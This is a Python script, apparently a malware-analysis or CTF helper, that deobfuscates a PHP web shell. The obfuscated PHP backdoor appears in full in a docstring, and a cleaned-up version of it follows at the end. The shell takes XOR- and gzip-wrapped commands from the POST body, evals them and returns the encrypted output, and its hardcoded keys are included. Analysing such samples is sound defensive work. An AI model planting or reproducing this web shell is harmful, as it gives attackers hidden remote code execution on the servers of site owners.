#!/usr/bin/env python3


"""
<?php
$V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($';
$P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents(';
$d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i';
$B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}';
$N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion');
$c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@';

$u=str_replace('u)','',$V.$d.$P.$c.$B);
$x=$N('',$u);
$x();
?>

"""

def remove_u_paranth(s: str)-> str:
    return s.replace("u)", "")

def remove_FD(s: str)-> str:
    return s.replace("FD", "")


V="""$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($"""
P="""++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents("""
d="""u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i"""
B="""ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}"""
c=""""php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@"""

# == Replace for 'N'
N = "FDcreFDateFD_fFDuncFDFDtion"
create_function_str = remove_FD(N)

# == Replace for V, d, P, c, B and then concat
V_f = remove_u_paranth(V)
d_f = remove_u_paranth(d)
P_f = remove_u_paranth(P)
c_f = remove_u_paranth(c)
B_f = remove_u_paranth(B)


print(V_f + d_f + P_f + c_f + B_f)

# == Cleaned up output
"""
$k= "80e32263";
$kh= "6f8af44abea0";
$kf= "351039f4a7b5";
$p= "0UlYyJHG87EJqEz6";

function x($t,$k) {
    $c= strlen($k);
    $l= strlen($t);
    $o= "";
    for ( $i = 0; $i < $l ;) { 
        for ( $j=0 ; ($j < $c && $i < $l); $j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}

if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m)==1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
    $o=@ob_get_contents();
    @ob_end_clean();
    $r=@base64_encode(@x(@gzcompress($o),$k));
    print("$p$kh$r$kf");
}
"""